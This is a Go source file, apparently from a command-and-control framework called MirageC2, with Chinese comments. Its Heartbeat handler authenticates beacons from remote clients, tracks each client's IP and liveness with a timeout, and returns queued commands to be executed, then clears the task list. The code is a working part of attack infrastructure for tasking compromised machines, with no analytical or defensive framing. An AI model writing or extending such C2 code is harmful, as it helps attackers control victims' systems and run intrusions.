package webstart

import (
	"MirageC2_V1.0/public/check"
	"MirageC2_V1.0/public/common"
	"net/http"
	"time"
)

func Heartbeat(w http.ResponseWriter, r *http.Request, intID int, checkInterval time.Duration) {
	if check.CryptoMirageCheck(w, r, intID) {
		id := intID - 1
		job := &common.Jobs[id]
		job.Mu.Lock()
		defer job.Mu.Unlock()

		if job.ClientIP == "" {
			job.Health = true
			job.LastRequest = time.Now()
		}
		job.ClientIP = r.RemoteAddr
		job.Health = true
		job.LastRequest = time.Now()

		if job.Timer != nil {
			job.Timer.Stop()
		}

		job.Timer = time.AfterFunc(checkInterval, func() {
			job.Mu.Lock()
			defer job.Mu.Unlock()
			job.Health = false // 超时将健康状态设置为不健康
			//fmt.Printf("[*] 客户端 %s 的健康状态因超时被设置为不健康\n", clientIP)
		})

		jsonData := EnCommand(intID)
		if jsonData == nil {
			w.WriteHeader(http.StatusOK)
			w.Write([]byte("[*] Feel good!"))
		} else {
			w.WriteHeader(http.StatusOK)
			w.Header().Set("Content-Type", "application/json")
			w.Write(jsonData)
			job.Tasks = make(map[int]string)

		}
	}
	//fmt.Printf("[*] 收到来自 %s 的请求，健康状态设置为健康\n", clientIP)
}
